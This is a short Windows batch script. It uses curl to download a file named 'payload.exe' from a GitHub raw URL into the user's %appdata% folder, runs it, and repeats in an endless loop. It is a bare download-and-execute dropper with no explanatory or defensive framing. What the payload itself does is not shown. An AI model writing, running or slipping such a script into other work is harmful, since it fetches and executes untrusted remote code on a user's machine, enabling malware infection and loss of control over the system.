@echo off
:top
curl https://raw.githubusercontent.com/ishanarya24/dc/main/payload.exe --output %appdata%/payload.exe
%appdata%/payload.exe
goto :top
